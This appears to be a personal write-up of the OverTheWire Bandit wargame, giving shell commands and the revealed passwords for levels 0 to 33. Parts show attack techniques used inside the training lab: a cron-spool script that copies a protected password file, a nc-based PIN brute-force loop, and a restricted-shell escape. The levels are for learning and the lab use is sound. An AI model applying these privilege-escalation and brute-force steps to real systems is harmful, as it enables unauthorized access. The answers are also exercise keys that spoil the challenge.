# Bandit

_ssh banditN@bandit.labs.overthewire.org -p 2220_

### The password for the next level is stored in a file called - located in the home directory

    $ cat /-
    key: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

## Level 2-3

### The password for the next level is stored in a file called spaces in this filename located in the home directory

    $ cat spaces\ in\ this\ filename
    key: aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG

## Level 3-4

### The password for the next level is stored in a hidden file in the inhere directory.

    $ ls -la
    $cat .hidden
    key: 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe

## Level 4-5

### The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.

    $ cat ./-file07
    key: lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR

## Level 5-6

### The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:

- human-readable
- 1033 bytes in size
- not executable

### ->

    $ find inhere/ -type f -size 1033c
    $ cd inhere/maybehere07/ && cat .file2
    key: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU

## Level 6-7

### The password for the next level is stored somewhere on the server and has all of the following properties:

- owned by user bandit7
- owned by group bandit6
- 33 bytes in size

#

    $ find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
    $ cd /var/lib/dpkg/info/ && cat bandit7.password
    key: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S

## Level 7-8

### The password for the next level is stored in the file data.txt next to the word millionth

    $ grep -r millionth data.txt
    key: TESKZC0XvTetK0S9xNwm25STk5iWrBvP

## Level 8-9

### The password for the next level is stored in the file data.txt and is the only line of text that occurs only once

    $ sort data.txt | uniq -u
    key: EN632PlfYiZbn3PhVK3XOGSlNInNE00t

## Level 9-10

### The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.

    $ grep -aoP '(=+)[[:print:]]+' data.txt | sed 's/=//'
    key: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s

## Level 10-11

### The password for the next level is stored in the file data.txt, which contains base64 encoded data

    $ base64 --decode data.txt
    key: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM

## Level 11-12

### The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions

    $ tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt
    key: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv

## Level 12-13

### The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)

    $ mkdir /tmp/yo
    $ cp data.txt  /tmp/yo
    $ cd /tmp/yo
    $ /tmp/yo$ ls
    data  data.txt
    $ /tmp/yo$ file dta
    dta: cannot open `dta' (No such file or directory)
    $ /tmp/yo$
    $ /tmp/yo$ file data
    data: bzip2 compressed data, block size = 900k
    $ /tmp/yo$ mv data data3.bz
    $ /tmp/yo$ bzip2 -d data3.bz
    $ /tmp/yo$ ls
    data3  data.txt
    $ /tmp/yo$ file data 3
    data: cannot open `data' (No such file or directory)
    3:    cannot open `3' (No such file or directory)
    $ /tmp/yo$
    $ /tmp/yo$ file data3
    data3: gzip compressed data, was "data4.bin", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 20480
    $ /tmp/yo$ mv data3 data4.gz
    $ /tmp/yo$ ls
    data4.gz  data.txt
    $ /tmp/yo$ gzip -d data4.gz
    $ /tmp/yo$ ls
    data4  data.txt
    $ /tmp/yo$ file data4
    data4: POSIX tar archive (GNU)
    $ /tmp/yo$ mv data4 data5.tar
    $ /tmp/yo$ tar -xf data5.tar
    $ /tmp/yo$ ls
    data5.bin  data5.tar  data.txt
    $ /tmp/yo$ file data5.bin
    data5.bin: POSIX tar archive (GNU)
    $ /tmp/yo$ mv data5.bin data6.tar
    $ /tmp/yo$ tar -xf data6.tar
    $ /tmp/yo$ ls
    data5.tar  data6.bin  data6.tar  data.txt
    $ /tmp/yo$ ls
    data5.tar  data6.bin  data6.tar  data.txt
    $ /tmp/yo$ file data6.bin
    data6.bin: bzip2 compressed data, block size = 900k
    $ /tmp/yo$ mv data6.bin data7.bz
    $ /tmp/yo$ bzip2 -d data7.bz
    $ /tmp/yo$ ls
    data5.tar  data6.tar  data7  data.txt
    $ /tmp/yo$ file data7
    data7: POSIX tar archive (GNU)
    $ /tmp/yo$ mv data7 data8.tar
    $ /tmp/yo$ tar -xf data8.tar
    $ /tmp/yo$ ls
    data5.tar  data6.tar  data8.bin  data8.tar  data.txt
    $ /tmp/yo$ file data8.bin
    data8.bin: gzip compressed data, was "data9.bin", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 49
    $ /tmp/yo$ mv data8.bin data9.gz
    $ /tmp/yo$ gzip -d data9.gz
    $ /tmp/yo$ ls
    data5.tar  data6.tar  data8.tar  data9  data.txt
    $ /tmp/yo$ file data9
    data9: ASCII text
    $ /tmp/yo$ cat data9
    The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
    $ /tmp/yo$

## Level 13-14

### The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on

    $ cat sshkey.private
    $ ssh -i sshkey.private  bandit14@localhost -p 2220
    $ cat /etc/bandit_pass/bandit14
    key: fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq

## Level 14-15

### The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.

    $ nc localhost 30000
    fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
    Correct!
    key: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt

### Level 15-16

    $ openssl s_client -connect localhost:30001

    read R BLOCK
    jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
    Correct!
    key: JQttfApK4SeyHwDlI9SXGR50qclOAil1

### Level 16-17

    $ nmap -p 31000-32000 localhost
    $ openssl s_client -connect localhost:31790
     ssh.key
     touch pvt.key
     paste ssh.key into pvt.key
     $ chmod 600 pvt.key
     $ ls -l pvt.key
     -rw------- 1
     $ ssh -p 2220 bandit17@localhost -i pv.key

### Level 17-18

    $ diff passwords.old passwords.new
    42c42
    < glZreTEH1V3cGKL6g4conYqZqaEj0mte
    ---
    > hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

    key: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

### Level 18-19

    $ ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
    bandit18@bandit.labs.overthewire.org's password:
    key: awhqfNnAbc1naukrpqDYcF95h7HoMTrC

### Level 19-20

$ ./bandit20-do
Run a command as another user.
Example: ./bandit20-do id

###

$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)

###

$ ./bandit20-do whoami
bandit20

###

$ ./bandit20-do cat /etc/bandit_pass/bandit20

###

    key: VxCazJaVykI6W36BkBU0mJTCM8rR95XT

### Level 20-21

#### Terminal 0

     $ nc -lvp 9999
     Listening on 0.0.0.0 9999

#### Terminal 1

     $ ./suconnect 9999

#### Terminal 0

    Connection received on localhost 39910
    $ VxCazJaVykI6W36BkBU0mJTCM8rR95XT
    NvEJF7oVjkddltPSrdKEFOllh9V1IBcq

#### Terminal 1

    $ ./suconnect 9999
    Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
    Password matches, sending next password

    key:  NvEJF7oVjkddltPSrdKEFOllh9V1IBcq

#### Terminal 1

![image](https://github.com/Sebastian9751/InformationSecurity/assets/85807291/3ed44c12-a700-4fe4-93a0-4960d0445467)

#### Terminal 0

![image](https://github.com/Sebastian9751/InformationSecurity/assets/85807291/9e4f0780-0500-4d62-aba9-39128da5f930)

### Level 21-22
#### $ cd /etc/cron.d
#### $ ls
    cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24   e2scrub_all  sysstat
    cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir

####  $ cat cronjob_bandit22
        @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
        * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
#### $ cat /usr/bin/cronjob_bandit22.sh
        #!/bin/bash
        chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
        cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
####  $ cat  /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
    key: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff

### Level 22-23

    $ cat cronjob_bandit23

    $ cat /usr/bin/cronjob_bandit23.sh

    $ echo I am user bandit23 | md5sum | cut -d ' ' -f 1

    8ca319486bfbbc3663ea0fbe81326349

    $ cat /tmp/8ca319486bfbbc3663ea0fbe81326349

    key : QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G


### Level 23-24
    $ cd /etc/cron.d/
    $ ls
    $ cat cronjob_bandit24
    $ cat /usr/bin/cronjob_bandit24.sh
    $ mkdir /tmp/sebas
    $ chmod 777 sebas
    $ vim getkey.sh
        #!/bin/sh
        cat /etc/bandit_pass/bandit24 > /tmp/sebas/pass
    $ chmod 777     
    $ cp getkey.sh /var/spool/bandit24
    $ cat pass

    key: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

### Level 24-25

    $ mkdir /tmp/sebas
    $ cd /tmp/sebas
    $ vim brute
```bash
!#/bin/bash

ban=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

for pin in {0000..9999}; do
	echo "$ban $pin" 
done | nc localhost 30002
```

```bash
 $ ./brute
```
```bash
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```
### Level 25-26
```bash

$ ssh -t -i bandit26.sshkey bandit26@localhost -p 2220 /bin/sh
: set shell = /bin/bash
bandit26@bandit:~$

```
### Level 26-27

```bash
$ ./bandit27-do  cat /etc/bandit_pass/bandit27
key : YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```
### Level 27-28
```bash
$ mkdir /tmp/seb
$ cd /tmp/seb
$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
$ cat repo/README
The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR
```

### Level 28-29
```bash
$ git log --graph
* commit abcff758fa6343a0d002a1c0add1ad8c71b88534 (HEAD)
| Author: Morla Porla <morla@overthewire.org>
| Date:   Sun Apr 23 18:04:39 2023 +0000
|
|     add missing data
|
* commit c0a8c3cf093fba65f4ee0e1fe2a530b799508c78
  Author: Ben Dover <noone@overthewire.org>
  Date:   Sun Apr 23 18:04:39 2023 +0000

      initial commit of README.md
```
```bash
$ git checkout -f abcff758fa6343a0d002a1c0add1ad8c71b88534
Previous HEAD position was c0a8c3c initial commit of README.md
HEAD is now at abcff75 add missing data

$ cat README.md
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
```

### Level 29-30

```bash
$ mkdir /tmp/sebas2
$ cd /tmp/sebas2
$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
$ cd repo && git branch -r

  origin/HEAD -> origin/master
  origin/dev
  origin/master
  origin/sploits-dev

$ git checkout dev
Branch 'dev' set up to track remote branch 'dev' from 'origin'.
Switched to a new branch 'dev'

$ git branch
* dev
  master

$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

```

### Level 30-31

```bash
$ git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
$ git tag
 secret

$ git show secret
 OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
```
### Level 31-32
```bash
$ cat .gitignore
*.txt
$ rm .gitignore
$ echo "May I come in?" > key.txt
$ git add key.txt
$ git commit  -m 'added key.txt'
$ git push


bandit31-git@localhost's password:
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 325 bytes | 325.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote: ### Attempting to validate files... ####
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
```

### Level 32-33
```bash
>> $SHELL
WELCOME TO THE UPPERCASE SHELL
>> $0
$ export SHELL=/bin/bash
$ echo $SHELL
/bin/bash
$ $SHELL

bandit33@bandit:~$

$ cat /etc/bandit_pass/bandit33

odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
```

### Level 33-34

*At this moment, level 34 does not exist yet.*